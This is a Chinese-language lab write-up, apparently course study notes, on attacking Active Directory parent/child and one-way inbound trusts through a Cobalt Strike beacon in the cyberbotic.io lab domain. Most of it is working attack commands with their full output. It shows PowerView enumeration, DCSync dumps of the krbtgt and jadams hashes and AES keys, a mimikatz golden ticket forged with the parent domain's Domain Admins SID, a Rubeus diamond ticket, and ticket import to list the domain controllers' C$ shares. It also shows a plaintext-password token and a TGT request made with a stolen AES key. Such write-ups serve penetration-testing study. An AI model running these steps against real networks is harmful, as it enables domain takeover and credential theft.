# Parent/Child

枚举域信任关系

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 24 bytes
[*] You are DEV\bfarmer
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145560 bytes
beacon> powershell Get-DomainTrust
[*] Tasked beacon to run: Get-DomainTrust
[+] host called home, sent: 313 bytes
[+] received output:
#< CLIXML

[+] received output:


SourceName      : dev.cyberbotic.io
TargetName      : cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 8/7/2022 1:05:44 AM

SourceName      : dev.cyberbotic.io
TargetName      : subsidiary.external
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 8/7/2022 1:06:03 AM

```


子域 dev.cyberbotic.io对父域cyberbotic.io有双向信任关系（Bidirectional）

制作金票访问

首先要知道krbtgt的哈希

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[+] host called home, sent: 297586 bytes
[+] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 2/19/2021 1:31:57 PM
Object Security ID   : S-1-5-21-3263068140-2042698922-2891547269-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 833ef1dcc490f88a8f4a8a00859736de
    ntlm- 0: 833ef1dcc490f88a8f4a8a00859736de
    lm  - 0: b22a486933e82eb32723ebde745d18f4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ab6cf712f4b01301770b3b4a96803ac9

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : b9fefed6da865732

* Packages *
    NTLM-Strong-NTOWF
```

枚举父域的DA组的SID
```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
[*] Tasked beacon to run: Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
[+] host called home, sent: 497 bytes
[+] received output:
#< CLIXML

objectsid                                   
---------                                   
S-1-5-21-378720957-2217973887-3501892633-512
```


枚举父域DC名字

```
beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name
[*] Tasked beacon to run: Get-DomainController -Domain cyberbotic.io | select Name
[+] host called home, sent: 421 bytes
[+] received output:
#< CLIXML

Name              
----              
dc-1.cyberbotic.io
```

## 金票

```
kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661127998995.png)

导入金票访问
```
beacon> make_token CYBER\Administrator FakePass
[*] Tasked beacon to create a token for CYBER\Administrator
[+] host called home, sent: 46 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\cyberbotic.kirbi
[+] host called home, sent: 3049 bytes
beacon> ls \\dc-1\c$
[*] Tasked beacon to list files in \\dc-1\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2022 11:20:17   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     08/21/2022 10:22:29   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/25/2022 12:10:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     01/20/2022 15:50:53   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     08/21/2022 10:13:50   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     08/22/2022 00:06:58   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128044045.png)

## 钻票

请求tgt

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
[+] host called home, sent: 585669 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: Jv20RufkHst0H3cnOpCmY3SyBm3vAFxsMp1MPHpyzBs=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIErzCCBKugAwIBBaEDAgEWooIDoDCCA5xhggOYMIIDlKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA04wggNKoAMCARKhAwIBAqKCAzwEggM4oVinLCwTZzDMMCggeoW5QKOfW59mo6i8s+P5rxhJ2I/XzT4B9mYv6Y97TILRyyGHroS6/oY1Ba2eHxGXksbwfs8/ZEl6kFmwlHpvsozfh+TUYufOkLLtvXvSDefV26sC49IxSXM7fIMb3ZGvoRj/Z5cE4U7LbcEI6hz47lZdi8KkwCyUmj61SMWamvPS/1ZoaGYX9EkXLbv38MVItqT5422wR8tmd1wI+KyEhGQsCpYGuBsfhD/0S6UPIZmM32TBo3Uti5Cwcx5Wwxs88c3PwTy4/rNahvSbVzM+jIWHHrubFsCkvWlyuzSnSVtQL6T61kW/Rd0SnBs2hlacTnCT3a6G35/JBgcDUM2q3U6l1+AQa4H3wWcsl0i9SxrkEdiBQO42Nxq606gRM6uEVYeWtrV/RtzE1eN6b4342tee+Jiyyd01yc0x/fy4nyXrE3JSOkap6JjDWwlkCCpxvYbXiCEXZfD0MAafLbJAtemy/VXxSf70LLYmyhMUjCeZGf+myyBt584VmanC5kfbTqNoMe9yh+zauCLuj0ccaVHNhuZu1DKhsVdwKuEAAs0F9Sqfzy9lgxYVQsgL/MBc1fcbwJMNud7ZbD19SeO4KEbylin8eHrempfRZ9d3eBLxu6fvQRJdaN9XaxePYrEVuQ56jwFAycHGwVZ+KZRHtBABOhAkliivaS0PVtWqUv2csSyJ97t6MmGNaDt9CazOYXv0qrnJ6kwsm9noDzTVxhRWJ5uQyjbIWxb2r5VcDRvS9+lj1p0sOhKBjvNiZoGIq3AxPbSv1xJFUE0PugpdZr4pSQW0NGst1wwx+LSroINwBDiNMXf+Ao1h+0o+bvc+Rxoo0XlghjSahtf3cjSKjMd6YfWATOlcdwM5fNM0SlV26erFYupOkgv8JDAA+lE1xayTAGkEaP68cagzrZmd5r9y9g3d+CRn6zQmthLAiHZrfeTX5D2AGSH16bTS5fG8JoJc7OeMbzPebP3P3B9WJT/cehwSSWe9s3DG2lsW1RnPXBjJZfIkIc8uu+2fN3QATMXmTjw7GcFkFgqX8FlLQtaLC9RXuwJ5pfbiVhVH01TDM3OetU7B9ODWMXOjgfowgfegAwIBAKKB7wSB7H2B6TCB5qCB4zCB4DCB3aArMCmgAwIBEqEiBCA/EgUe14UNfhtgzl7gRO/KBIrBqxCqLRFjp6rLWxv9HKETGxFkZXYuY3liZXJib3RpYy5pb6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGAhAAClERgPMjAyMjA4MjIwMDI5MjFaphEYDzIwMjIwODIyMTAxODQxWqcRGA8xOTcwMDEwMTAwMDAwMFqoExsRZGV2LmN5YmVyYm90aWMuaW+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIEojCCBJ6gAwIBBaEDAgEWooIDkzCCA49hggOLMIIDh6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA0EwggM9oAMCARKhAwIBA6KCAy8EggMr7E/bynxRDyk/uWoWu6RqXOys8nuqAmIECAKSVUQ6h/4m1O2FfLq5RswHXrjw76P+s6kvHBKHOBddZkEzIiXZbT6jAySNw/EKjfvPPFaeK1Ag8iJsiqqyxIaiHIwdreWpzm/LgrTTxIUD3gPh0QtFqi2h8/qvr2HxDhGm3Zvr7WwLfn+JPtccbTGSiGCBDPJq50rdu7dFCTvBlFTYNEA0udLRohqapFnztALmHEeVvx97+Xt3yjyqirrAy38n4JNWXcp1uUlnxoiZkSIf8JzgI9a9rbDm0J9+PcYrmSZvs7zYradrpobPUBTSQTE2Bq4/mq5L7AT1cvCWXWFtlpBB95I+Yy5cJTD76+sEkoIt8Hbgv2AnkjvHm9N3jL7IZB9yl47lDefQn7EV1Uy6/JGkGJSemhvPosfcS+aXOpkz+vJlwaEiDEdaFBYYfxjEPeJ03dapXF8ocnhl8MN1HjrBQN8TaD4rdM9KXCyog4b9Kij52fh/AAUKhVRKg3KistHEw6y8W4YWS4TfWg/30Sq2ccMtG5E3HknbudsB033UdjxYUM6lf5FFo/6AE5dTnhp8gVZU55+c7aXPN2bBkxg4GZs2AKAmbF/i2z3jSZzpdzLpjoDzV8Cr/a29kQDmSIIUIZIb/hWXKbiyVKirhwasHJ0YchpgXdvOZUCe++TYgcXEidFJafSASRczs+QCumJBRiDcb3uJmsKeEGafG5tMRRFk4cm/Gj0l74mQq3tyCg8+EwITJNIgQRNNsMfSHHlbL2Vu5dkuy+WLBUs1K6hwADTfr88ItKPupuZIHcIszV7I8sstQ0AEIttcub9Z/ABqiS0kSOCXegaCU3HeAq76E3J3wYHkCeN81IHsaZhBKWDbIfXZ4L8rwbh0/0lO79ZbPuLXQEWbc/MRNT2Jwj9Yo028zbLNWa+zWqF0cVRNVwLezYGs4dbEajHeSOKjfWamCvIWJiX7GXRGCmqCGUKCj0JBxPC42LF8qUGDtEaftHUKF+W73tI/5UUtLl7O2dou2Ufpt3tfqJ7OYNSuhs2ObcfuSoddWLvyQKGTIaWXN6C619umskmUJ3FNhKOB+jCB96ADAgEAooHvBIHsfYHpMIHmoIHjMIHgMIHdoCswKaADAgESoSIEID8SBR7XhQ1+G2DOXuBE78oEisGrEKotEWOnqstbG/0coRMbEWRldi5jeWJlcmJvdGljLmlvohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAYCEAAKURGA8yMDIyMDgyMjAwMjkyMVqmERgPMjAyMjA4MjIxMDE4NDFapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFkZXYuY3liZXJib3RpYy5pb6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=



```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128624021.png)



制作tgt文件
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\Administrator.kirbi", [Convert]::FromBase64String("doIEojCCBJ6gAwIBBaEDAgEWooIDkzCCA49hggOLMIIDh6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA0EwggM9oAMCARKhAwIBA6KCAy8EggMr7E/bynxRDyk/uWoWu6RqXOys8nuqAmIECAKSVUQ6h/4m1O2FfLq5RswHXrjw76P+s6kvHBKHOBddZkEzIiXZbT6jAySNw/EKjfvPPFaeK1Ag8iJsiqqyxIaiHIwdreWpzm/LgrTTxIUD3gPh0QtFqi2h8/qvr2HxDhGm3Zvr7WwLfn+JPtccbTGSiGCBDPJq50rdu7dFCTvBlFTYNEA0udLRohqapFnztALmHEeVvx97+Xt3yjyqirrAy38n4JNWXcp1uUlnxoiZkSIf8JzgI9a9rbDm0J9+PcYrmSZvs7zYradrpobPUBTSQTE2Bq4/mq5L7AT1cvCWXWFtlpBB95I+Yy5cJTD76+sEkoIt8Hbgv2AnkjvHm9N3jL7IZB9yl47lDefQn7EV1Uy6/JGkGJSemhvPosfcS+aXOpkz+vJlwaEiDEdaFBYYfxjEPeJ03dapXF8ocnhl8MN1HjrBQN8TaD4rdM9KXCyog4b9Kij52fh/AAUKhVRKg3KistHEw6y8W4YWS4TfWg/30Sq2ccMtG5E3HknbudsB033UdjxYUM6lf5FFo/6AE5dTnhp8gVZU55+c7aXPN2bBkxg4GZs2AKAmbF/i2z3jSZzpdzLpjoDzV8Cr/a29kQDmSIIUIZIb/hWXKbiyVKirhwasHJ0YchpgXdvOZUCe++TYgcXEidFJafSASRczs+QCumJBRiDcb3uJmsKeEGafG5tMRRFk4cm/Gj0l74mQq3tyCg8+EwITJNIgQRNNsMfSHHlbL2Vu5dkuy+WLBUs1K6hwADTfr88ItKPupuZIHcIszV7I8sstQ0AEIttcub9Z/ABqiS0kSOCXegaCU3HeAq76E3J3wYHkCeN81IHsaZhBKWDbIfXZ4L8rwbh0/0lO79ZbPuLXQEWbc/MRNT2Jwj9Yo028zbLNWa+zWqF0cVRNVwLezYGs4dbEajHeSOKjfWamCvIWJiX7GXRGCmqCGUKCj0JBxPC42LF8qUGDtEaftHUKF+W73tI/5UUtLl7O2dou2Ufpt3tfqJ7OYNSuhs2ObcfuSoddWLvyQKGTIaWXN6C619umskmUJ3FNhKOB+jCB96ADAgEAooHvBIHsfYHpMIHmoIHjMIHgMIHdoCswKaADAgESoSIEID8SBR7XhQ1+G2DOXuBE78oEisGrEKotEWOnqstbG/0coRMbEWRldi5jeWJlcmJvdGljLmlvohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAYCEAAKURGA8yMDIyMDgyMjAwMjkyMVqmERgPMjAyMjA4MjIxMDE4NDFapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFkZXYuY3liZXJib3RpYy5pb6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8="))
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128651094.png)

导入票据，访问父域DC
```
beacon> make_token CYBER\Administrator FakePass
[*] Tasked beacon to create a token for CYBER\Administrator
[+] host called home, sent: 46 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\Administrator.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\Administrator.kirbi
[+] host called home, sent: 2752 bytes
beacon> ls \\dc-1\c$
[*] Tasked beacon to list files in \\dc-1\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2022 11:20:17   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     08/21/2022 10:22:29   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/25/2022 12:10:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     01/20/2022 15:50:53   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     08/21/2022 10:13:50   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     08/22/2022 00:06:58   pagefile.sys
```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661128686688.png)


# One-Way (Inbound)

对subsidiary.external有入站信任


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661129314833.png)

根据入站信任可以枚举外域的域信息，返回外域的DC
```
beacon> powershell Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName
[*] Tasked beacon to run: Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName
[+] host called home, sent: 457 bytes
[+] received output:
#< CLIXML

dnshostname           
-----------           
ad.subsidiary.external

```


下面查询返回外域关联的组合组成员信息

```
beacon> powershell Get-DomainForeignGroupMember -Domain subsidiary.external
[*] Tasked beacon to run: Get-DomainForeignGroupMember -Domain subsidiary.external
[+] host called home, sent: 421 bytes
[+] received output:
#< CLIXML


GroupDomain             : subsidiary.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external
MemberDomain            : subsidiary.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,
                          DC=external

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
[+] host called home, sent: 433 bytes
[+] received output:
#< CLIXML
DEV\Subsidiary Admins

```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661129573253.png)

```Get-NetLocalGroupMember```可以枚举机器的本地组成员。这表明它```DEV\Subsidiary Admins```是域控制器上本地管理员组的成员。

```
beacon> powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external
[*] Tasked beacon to run: Get-NetLocalGroupMember -ComputerName ad.subsidiary.external
[+] host called home, sent: 429 bytes
[+] received output:
#< CLIXML


ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\Administrator
SID          : S-1-5-21-2460913729-3421472287-1760394537-500
IsGroup      : False
IsDomain     : False

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\Enterprise Admins
SID          : S-1-5-21-2460913729-3421472287-1760394537-519
IsGroup      : True
IsDomain     : False

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\Domain Admins
SID          : S-1-5-21-2460913729-3421472287-1760394537-512
IsGroup      : True
IsDomain     : False

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : DEV\Subsidiary Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : SUBSIDIARY\testadmin
SID          : S-1-5-21-2460913729-3421472287-1760394537-1113
IsGroup      : False
IsDomain     : False


```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661129702198.png)


枚举成员Subsidiary Admins的组成员

```
beacon> powershell Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName
[*] Tasked beacon to run: Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName
[+] host called home, sent: 461 bytes
[+] received output:
#< CLIXML

MemberName
----------
jadams
```

dcsync dev.cyberbotic.io DEV\jadams

## 利用明文密码
jadams是本域成员，同时也是外域的管理组成员，假设现在有了jadams的明文密码，最简单的访问访问是make_token

明文密码：```N3wPassw0rd!```
```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
beacon> ls \\ad.subsidiary.external\c$
[*] Tasked beacon to list files in \\ad.subsidiary.external\c$
[+] host called home, sent: 45 bytes
[-] could not open \\ad.subsidiary.external\c$\*: 5
beacon> make_token DEV\jadams N3wPassw0rd!
[*] Tasked beacon to create a token for DEV\jadams
[+] host called home, sent: 41 bytes
[+] Impersonated DEV\bfarmer
beacon> ls \\ad.subsidiary.external\c$
[*] Tasked beacon to list files in \\ad.subsidiary.external\c$
[+] host called home, sent: 45 bytes
[*] Listing: \\ad.subsidiary.external\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:11:33   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     09/09/2021 13:41:54   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 22:51:50   System Volume Information
          dir     05/16/2021 11:58:30   Users
          dir     05/16/2021 11:31:57   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 448mb    fil     08/22/2022 22:57:03   pagefile.sys
```

1661211307021.png


## 利用哈希

拿到jadams的哈希
```
mimikatz # lsadump::dcsync /domain:dev.cyberbotic.io /user:jadams
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'jadams' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Joyce Adams

** SAM ACCOUNT **

SAM Username         : jadams
User Principal Name  : jadams@dev.cyberbotic.io
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 1/1/1601 12:00:00 AM
Password last change : 8/17/2022 11:16:51 PM
Object Security ID   : S-1-5-21-3263068140-2042698922-2891547269-1121
Object Relative ID   : 1121

Credentials:
  Hash NTLM: 126502da14a98b58f2c319b81b3a49cb
    ntlm- 0: 126502da14a98b58f2c319b81b3a49cb
    ntlm- 1: fde0e9c401de76ae603d140fcdb3b9da
    lm  - 0: 3e7b1589ac77b42e2104b9316947c2e5
    lm  - 1: 1e77387fbbfb87f98b5b88650dd7a4d8

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : be63c5cf815ed8771d1187522bec4e2a

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOjadams
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52
      aes128_hmac       (4096) : 69cb6f53741fa3923476068026ca8407
      des_cbc_md5       (4096) : 64730b7cd6fe5b7a
    OldCredentials
      aes256_hmac       (4096) : 70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80
      aes128_hmac       (4096) : ba49116dbf4a12b9041ef5569ba3e699
      des_cbc_md5       (4096) : 20b6f2257a525dda

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOjadams
    Credentials
      des_cbc_md5       : 64730b7cd6fe5b7a
    OldCredentials
      des_cbc_md5       : 20b6f2257a525dda

* Packages *
    NTLM-Strong-NTOWF
```

请求jadamas的tgt
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52 /opsec /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52 /opsec /nowrap
[+] host called home, sent: 585525 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT


[+] received output:
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)

[+] received output:
[!] Pre-Authentication required!
[!] AES256 Salt: DEV.CYBERBOTIC.IOjadams
[*] Using aes256_cts_hmac_sha1 hash: 178aaea34e7c37d77fde27e2da34e6311bd0ac609c871b925a53bdc69e832a52
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jadams'

[+] received output:
[*] Using domain controller: 10.10.17.71:88

[+] received output:
[+] TGT request successful!

[+] received output:
[*] base64(ticket.kirbi):

      doIFhDCCBYCgAwIBBaEDAgEWooIEfDCCBHhhggR0MIIEcKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBCowggQmoAMCARKhAwIBAqKCBBgEggQUWdzG75AaeQRyixDkkkIkAdYD4EzJtRO53FCGE5rJZdKAHAC0WkV0x5qKlZ39l8IOMF9dLXET0GHJb+V0MWPqwCDF7+RimjqUGHn5/WTXCHZZJNA8XcbDCchD6+JbXXAJhlUnQBoi19/rZKmwmpqvyguRBjwoOW3gp9lksoTjdW9ds8onu57PyjI8su2lZj4/j2X4ds+DNKdXS3JXDc+MDkERoL4PcoQtFyF3yG78cnZZtR9uVxzdtfFaIkJBDCMnX3C3blaVKWYe6nbzE98Ukm/L4hYUNKH47pLr5yUuUx98FCUhQagQuTrKZe8t5p7IQtlhQJeF2Z+sEcQwxYU3NY0avINMQFPyI4HpAXEphZ4OEQ15yVNbS7MZMyh1p/2Q6MpDDiLrcrWEbpya6g8Q9l8+uzw8whZSfgss2gcx92x2RSTkDvIcyUgxsm2U7eNm9L3cwEMyb70bldEFRjapg0mfE308GC4TO1zPB3pFf6ew49Ih1aPGpCKUs6QiEeS0zashKKv1KNlteulMVOl6HOvJnjNwweRYlp2/rDcycAPCC1h4odLoXSuBDuqDQ/UwVa31Uj4PuSxDRfpT8Iutw24ExFgeq94Ww6g+OsrWkLTwwCpYw+Lh5sG73MjFr/NILtGucKwMoNPi7jro34XsSVP6gDI+q80JhAGzgFmLd0itVYvFVxdtkzHAokH1Jyk8PLz1DpJREKXBSh932Q2nsGR4ieYB09H0nIBt1Xc1XYDDYDbbBUqqz5Nf+hpT3fCqqNplELKbWFpDlWnWSyFYTnaNBy/zM875ZPlAzpvVvhpLpVIlJg9fFqch5v53DW9hNGiOU40qqrHIb3iPdl3GoSpaDDTbColTdtrW+6Rn45uQCnNzTLo4jZ7G6iPx8yTNcIaBROezXB3G1ShMwIceMATTaCt4GqJcqDPBSqG+C3Y8chHxzwIQuQH5gvhDw1VRCJUnIRqOmoRg9D2Md+QGoPt+9UotN8VvSdzcVLO8FHYn5xsjcHt2x5Uu0IT9LnHat3PtaBLjAXrFEBdllc01NJ6r41UNXMlJhDTcCFQFIfgCuPA95QxPtfm8d4Yx27joZtc/h0txpIjPQ68qpS4QEq54kMNWZHy6zd8Lt/qOhDBiC31pXjofi46gpiX12TzuhaOy3wwd4L05juuKeuKC13qQvq6qZ52rom7SfsYI05r4HOc+3oyyfBqIR4VwGg0fb+zNb0wJn/R1ioLWTQpkTTx/OFwurzqi24Z95MTtoJrvM0DA5kLd70RhMWVW/Q3Pz4+s+BMm4IY7JAK+T1McuXg+VBjdDADgxzWzH5V0AiAGzvw9oWWHpT+YZSqACXuQfm3XMac4c5yT/p1ZlLR5aUsMa4LUSZPzSWRrLK/WCXYCOHnko4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQgjLZe4dgsRd3TeNKzqydFEpGOTUWaQweZeogXCh0RUVihExsRREVWLkNZQkVSQk9USUMuSU+iEzARoAMCAQGhCjAIGwZqYWRhbXOjBwMFAEDhAAClERgPMjAyMjA4MjMyMzI5MTZaphEYDzIwMjIwODI0MDkyOTE2WqcRGA8yMDIyMDgzMDIzMjkxNlqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

[+] received output:

  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jadams
  UserRealm                :  DEV.CYBERBOTIC.IO
